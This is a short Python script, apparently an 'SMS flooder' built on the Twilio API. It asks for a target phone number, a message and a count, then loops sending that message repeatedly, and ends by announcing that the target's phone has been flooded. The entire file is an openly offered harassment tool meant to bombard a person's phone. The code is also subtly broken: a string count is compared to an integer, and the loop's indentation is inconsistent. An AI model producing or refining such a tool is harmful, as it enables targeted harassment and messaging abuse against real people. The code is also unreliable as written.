from twilio.rest import Client

i = 0
account_sid = "" # Your Account SID
auth_token = "" #Your Auth Token






print("\033[1;32;40m                           ________                __         ")
print("\033[1;32;40m   _________ ___  _____   / ____/ /___  ____  ____/ /__  _____")
print("\033[1;32;40m  / ___/ __ `__ \/ ___/  / /_  / / __ \/ __ \/ __  / _ \/ ___/")
print("\033[1;32;40m (__  ) / / / / (__  )  / __/ / / /_/ / /_/ / /_/ /  __/ /    ")
print("\033[1;32;40m/____/_/ /_/ /_/____/  /_/   /_/\____/\____/\__,_/\___/_/     \n")
print("\033[1;32;40m by Eclipse \n")
print("\033[1;37;44m Please ensure your Twilio Account Sid, Auth Token, and Phone Number are set in the smsFlood.py file \n")
print("\033[1;30;41m !!IMPORTANT!! - Make sure your twilio phone number has the '+1' extention, or your applicable country code. \n")

attack_ph = input("\033[1;32;40m Enter phone to flood eg.+1xxxxxxxxxx > ")
print("")
flood_amount = input("\033[1;32;40m SMS Flood amount? > ")
flood_message = input ("\033[1;32;40m Message to send? > ")

client = Client(account_sid, auth_token)

i = 1
while i < flood_amount:
    sms = client.messages.create(

             from_ = "", # Your Twilio number
             body = flood_message,
             to = attack_ph
         )
         i += 1

print("\033[1;32;40m Sucess, targets phone has been flooded!")
